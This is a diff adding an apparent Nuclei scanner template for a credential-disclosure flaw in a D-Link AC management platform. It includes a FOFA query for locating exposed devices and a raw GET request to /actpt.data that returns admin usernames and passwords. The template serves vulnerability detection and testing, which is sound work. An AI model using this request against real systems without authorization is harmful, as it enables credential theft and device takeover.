@@ -1,0 +1,25 @@
+id: d-link-ac-actpt_data-information-disclosure
+
+info:
+  name: D-Link AC集中管理平台 actpt.data 敏感信息泄露
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="login_title:'D-Link路由器管理页'"
+    D-Link AC集中管理平台 actpt.data 接口存在敏感信息泄露漏洞，攻击者可直接访问该接口获取管理员账号密码等敏感信息，可能导致系统被非法登录和控制。
+  reference:
+    - 
+  tags: information-disclosure, d-link, ac-management-platform
+
+http:
+  - raw:
+      - |-
+        GET /actpt.data HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 敏感信息泄露
+        dsl:
+          - "status_code == 200 && contains_all(body, 'http_username', 'http_passwd')"
